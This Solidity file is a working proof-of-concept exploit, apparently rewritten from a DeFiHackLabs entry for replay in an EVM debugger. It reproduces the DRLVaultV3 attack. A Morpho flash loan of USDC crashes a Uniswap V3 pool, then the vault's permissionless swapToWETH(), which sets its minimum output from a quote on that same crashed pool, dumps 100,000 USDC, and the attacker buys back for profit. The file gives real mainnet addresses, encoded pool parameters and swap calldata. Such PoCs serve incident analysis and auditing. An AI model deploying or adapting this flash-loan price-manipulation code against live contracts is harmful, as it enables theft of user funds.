// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// @KeyInfo - Total Lost : 100,000 USDC drained from the vault (attacker nets ~27.1 WETH)
// Attacker EOA (real tx): https://etherscan.io/address/0xC0ffeEBABE5D496B2DDE509f9fa189C25cF29671
// Attack Contract (real tx): https://etherscan.io/address/0xe08d97e151473a848c3d9ca3f323cb720472d015
// Vulnerable Contract : https://etherscan.io/address/0x6A06707ab339BEE00C6663db17DdB422301ff5e8
// Attack Tx : https://etherscan.io/tx/0xe3eab35b288c086afa9b86a97ab93c7bb61d21b1951a156d2a8f6f5d5715c475
//
// @Analysis
// Post-mortem : https://blog.verichains.io/p/the-drlvaultv3-exploit-a-slippage
//
// Standalone rewrite (no forge-std/Test inheritance) so this replays cleanly in the
// playground's minimal EVM debugger - the original DeFiHackLabs PoC extends
// BaseTestWithBalanceLog (which extends forge-std Test) and its `balanceLog` modifier
// calls `vm.deal(...)`, a cheatcode that does not exist in this replay environment.

address constant USDC_ADDR = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
address constant WETH_ADDR = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

address constant USDC_WETH_POOL = 0xE0554a476A092703abdB3Ef35c80e0D76d32939F;

address constant MORPHO_ADDR = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;
address constant DEXROUTER_ADDR = 0x2E1Dee213BA8d7af0934C49a23187BabEACa8764;
address constant TOKEN_APPROVE = 0x40aA958dd87FC8305b97f2BA922CDdCa374bcD7f;
address constant VAULT_ADDR = 0x6A06707ab339BEE00C6663db17DdB422301ff5e8;

interface IERC20Min {
    function approve(address spender, uint256 value) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
}

interface IUniswapV3PoolMin {
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external returns (int256 amount0, int256 amount1);
}

interface IMorpho {
    function flashLoan(address token, uint256 assets, bytes calldata data) external;
}

interface IMorphoFlashLoanReceiver {
    function onMorphoFlashLoan(uint256 assets, bytes calldata data) external;
}

interface IDexRouter {
    function uniswapV3SwapTo(
        uint256 receiver,
        uint256 amount,
        uint256 minReturn,
        uint256[] calldata pools
    ) external payable returns (uint256 returnAmount);
}

interface IDRLVault {
    // The bug: swapToWETH() is public/permissionless and derives its slippage floor
    // from a live spot quote on the SAME pool it trades on (see src_DRLVaultV3.sol
    // in the registry, functions swapToWETH/getQuoteForUSDC).
    function swapToWETH(uint256 _amount) external returns (uint256 _amountOut);
}

contract DRLVaultV3 is IMorphoFlashLoanReceiver {
    IMorpho public morpho = IMorpho(MORPHO_ADDR);
    IDexRouter public dexRouter = IDexRouter(DEXROUTER_ADDR);
    IDRLVault public vault = IDRLVault(VAULT_ADDR);
    IUniswapV3PoolMin public pool = IUniswapV3PoolMin(USDC_WETH_POOL);

    uint256 FLASHLOAN_USDC = 13980773000000;
    uint256 VAULT_SWAP_USDC = 100000000000;

    // Recorded entrypoint. No cheatcodes used anywhere in this contract.
    function testExploit() external {
        bytes memory data = abi.encode(uint8(1));
        morpho.flashLoan(USDC_ADDR, FLASHLOAN_USDC, data);
    }

    function onMorphoFlashLoan(uint256 /*assets*/, bytes calldata /*data*/) external {
        require(msg.sender == address(morpho), "only Morpho");

        // Step 1: crash the USDC/WETH pool by dumping the whole flash-loaned USDC
        // balance into it via the 1inch-style DexRouter.
        IERC20Min(USDC_ADDR).approve(TOKEN_APPROVE, type(uint256).max);
        uint256 receiver = uint256(uint160(address(this)));
        uint256[] memory pools = new uint256[](1);
        pools[0] = 14474011154664524427946373127366704448275315930774981940324572871603728323487;
        dexRouter.uniswapV3SwapTo(receiver, FLASHLOAN_USDC, 96069676420420156, pools);

        // Step 2-3: call the vault's permissionless swapToWETH() while the pool is
        // crashed. Its "minimum out" is quoted from the same crashed pool, so it
        // happily sells the vault's full 100,000 USDC for ~0.00012 WETH.
        vault.swapToWETH(VAULT_SWAP_USDC);

        // Step 4: buy back WETH -> USDC to restore the pool price (this repurchases
        // the 100,000 USDC the vault just deposited into the pool).
        pools[0] = 57896044618658097711785492505624669893251560180390193455121166874571151938463;
        uint256 amountIn = 779999999999792152553;
        dexRouter.uniswapV3SwapTo{value: amountIn}(receiver, amountIn, 0, pools);

        IERC20Min(USDC_ADDR).approve(USDC_WETH_POOL, type(uint256).max);
        IERC20Min(WETH_ADDR).approve(USDC_WETH_POOL, type(uint256).max);

        // Wrap the remaining native ETH profit into WETH.
        (bool success, ) = payable(WETH_ADDR).call{value: address(this).balance}("");
        require(success, "ETH transfer failed");

        // Step 5: top up USDC to exactly the flash-loan amount with one more pool swap.
        bytes memory swapData =
            "0x0500c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2000044a9059cbb000000000000000000000000e0554a476a092703abdb3ef35c80e0d76d32939f00000000000000000000000000000000000000000000000050e0230d060eba7205";
        pool.swap(address(this), false, int256(-21291294107), 1461446703485210103287273052203988822378723970341, swapData);

        // Step 6: Morpho pulls the flash loan back via transferFrom after this call
        // returns, closing the loan. What remains on this contract is native profit,
        // already wrapped into WETH above.
        IERC20Min(USDC_ADDR).approve(MORPHO_ADDR, type(uint256).max);
    }

    function uniswapV3SwapCallback(int256 /*amount0Delta*/, int256 amount1Delta, bytes calldata) external {
        IERC20Min(WETH_ADDR).transfer(USDC_WETH_POOL, uint256(amount1Delta));
    }

    receive() external payable {}
}
